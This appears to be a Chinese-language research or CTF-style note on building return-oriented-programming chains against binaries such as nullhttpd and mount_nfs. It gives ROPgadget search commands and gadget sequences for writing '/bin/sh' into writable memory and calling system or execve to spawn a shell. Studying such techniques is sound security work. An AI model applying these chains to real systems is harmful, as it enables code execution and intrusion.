## 任意写
向任意内存地址rw写入内容"/bin/sh"，然后调用sys。

需要寻找往内存中写入数据的gadget（mov）
```
ROPgadget --binary mpathpersist.bin --only "pop|ret" | grep "rdi"
ROPgadget --binary mpathpersist.bin --only "mov|ret"
ROPgadget --binary mpathpersist.bin --only "mov|pop|ret"
ROPgadget --binary mpathpersist.bin | grep -v "jmp" | grep "mov qword"

----------------------
mov, stos, movs, movzx
```

然后查找控制寄存器的值的gadget(pop rdi)

然后寻找可写入地址(.data 和.bss)，和写入 p64(0x68732f6e69622f) （"/bin/sh"）
```
readelf -S nullhttpd.bin
---------------------------
pop rsi, ret
pop rdi, ret
mov qword ptr [rsi], rdi
pop rdi, ret
sys_addr
---------------------------
mov qword ptr [rbx], rax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret

mov byte ptr [rbp], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
add dword ptr [rbp - 0x3d], ebx ; nop ; ret



```

调用sys（设置参数rdi）
```
ROPgadget --binary mpathpersist.bin --only "pop|ret" | grep "rdi"
```

## evecve调用
调用execve(”/bin/sh”, 0, 0)。需要设置
`rdi`:"/bin/sh"地址
`rsi`:0
`rdx`:0
`rax`:0x3b
寻找syscall指令地址

```
ROPgadget --binary nullhttpd.bin --only "pop|ret" | grep "rsi"
ROPgadget --binary nullhttpd.bin --only "pop|ret" | grep "rdx"
ROPgadget --binary nullhttpd.bin --only "mov|pop|ret" | grep "eax"
ROPgadget --binary nullhttpd.bin | grep "syscall"

-------------------
基于1写入/bin/sh，（binsh_addr, 0, 0）
设置0然后add或sub
pop rdi, ret
pop rsi, ret
pop rdx, ret
pop eax, ret  | mov eax, 0x3b
syscall_addr
-------------------
设置rdx|edx -> 0

shl edx
xor
mov rdx, qword ptr [rbp - 8] ; mov qword ptr [rax], rdx ; pop rbp ; ret
xor edx, edx ; mov eax, edx ; pop rbx ; ret
shl edx, 4 ; add eax, edx ; ret  *8 time

0x0000000000423e58 : movzx edx, word ptr [rbp - 0x1c] ; mov word ptr [rax + 0x10], dx ; pop rbp ; ret

```

```
ROPgadget --binary mount_nfs.bin --only "pop|ret" | grep "rdi"
ROPgadget --binary mount_nfs.bin | grep -v "retf" | grep "ret" | grep -v "leave" | grep -v "\[rdx" | grep -v "\[edx" | grep "dx"

ROPgadget --binary mount_nfs.bin | grep -v "jmp" | grep "mov qword"
ROPgadget --binary mount_nfs.bin | grep -v "retf" | grep "ret" | grep -v "leave" | grep "mov qword"

ROPgadget --binary mount_nfs.bin | grep "syscall"

```
## 可控参数检查
rdi, rsi, rdx, rcx, r8, r9 或ecx
```
ROPgadget --binary nullhttpd.bin --only "pop|ret" | grep "rcx"
ROPgadget --binary nullhttpd.bin --only "mov|pop|ret" | grep "rcx"
ROPgadget --binary nullhttpd.bin | grep -v "jmp" | grep "ret" | grep "r8"
ROPgadget --binary nullhttpd.bin | grep -v "jmp" | grep "ret" | grep "xchg" | grep "r8"

-------------------
pop, mov，xchg, xor

pop rdi, ret
pop rsi, ret
pop rdx, ret
pop rcx, ret
pop r8, ret
pop r9, ret

mov rdi, ret
mov rsi, ret
mov rdx, ret
mov rcx, ret
mov r8, ret
mov r9, ret

check_argv_addr
```

设置可控参数，然后调用check_argv(返回到那个地址)

| register | value    |
| -------- | -------- |
| rdi      | 0x100001 |
| rsi      | 0x100002 |
| rdx      | 0x100003 |
| rcx      | 0x100004 |
| r8       | 0x100005 |
| r9       | 0x100006         |


## 目录
- binary
- debug.sh
- run.sh
- gadget
- rop.py
- rop1.py
- rop2.py
- rop3.py
- inp
